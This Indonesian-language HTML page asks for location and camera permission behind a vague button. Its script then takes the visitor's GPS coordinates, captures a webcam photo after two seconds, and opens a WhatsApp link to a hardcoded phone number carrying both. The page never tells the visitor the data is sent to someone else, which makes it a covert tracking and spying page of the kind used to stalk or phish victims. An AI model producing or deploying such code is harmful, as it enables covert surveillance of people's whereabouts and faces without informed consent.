<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Permintaan Izin Akses</title>
    <style>
        #permissionMessage {
            background-color: #f8f9fa;
            border: 1px solid #ccc;
            padding: 10px;
            text-align: center;
            margin: 20px;
        }
    </style>
</head>
<body>

<div id="permissionMessage">
    <p>Untuk melanjutkan, kami membutuhkan izin akses lokasi dan kamera Anda.</p>
    <button id="grantPermission">Berikan Izin</button>
</div>

<div id="location"></div>
<div id="photo"></div>

<script>
document.getElementById("grantPermission").onclick = function() {
    // Menyembunyikan pesan izin setelah tombol diklik
    document.getElementById("permissionMessage").style.display = 'none';

    // Meminta izin untuk mengakses lokasi
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
            var location = "Latitude: " + position.coords.latitude + ", Longitude: " + position.coords.longitude;
            document.getElementById("location").innerHTML = location;

            // Setelah mendapatkan lokasi, minta izin untuk mengakses kamera
            navigator.mediaDevices.getUserMedia({ video: true })
            .then(function(stream) {
                var video = document.createElement("video");
                video.srcObject = stream;
                video.play();
                
                // Ambil foto setelah beberapa detik
                setTimeout(function() {
                    var canvas = document.createElement("canvas");
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    var context = canvas.getContext("2d");
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);

                    // Tampilkan foto
                    var img = document.createElement("img");
                    img.src = canvas.toDataURL("image/png");
                    document.getElementById("photo").appendChild(img);

                    // Kirim ke nomor WhatsApp
                    var dataToSend = {
                        location: location,
                        photo: canvas.toDataURL("image/png")
                    };

                    sendToWhatsApp(dataToSend);
                    
                    // Hentikan stream kamera setelah mengambil gambar
                    stream.getTracks().forEach(track => track.stop());
                }, 2000);  // Tunggu 2 detik sebelum mengambil foto

            }).catch(function(err) {
                alert("Kamera tidak dapat diakses: " + err);
            });

        }, function(error) {
            alert("Lokasi tidak dapat diakses: " + error.message);
        });
    } else {
        alert("Geolocation tidak didukung oleh browser ini.");
    }
};

function sendToWhatsApp(data) {
    // Mengirim data ke WhatsApp
    var baseURL = "https://api.whatsapp.com/send?phone=085246691849&text=";
    var message = `Lokasi: ${data.location}\n\nFoto: ${data.photo}`;
    
    var encodedMessage = encodeURIComponent(message);
    var whatsappURL = baseURL + encodedMessage;

    window.open(whatsappURL, "_blank");
}
</script>

</body>
</html>
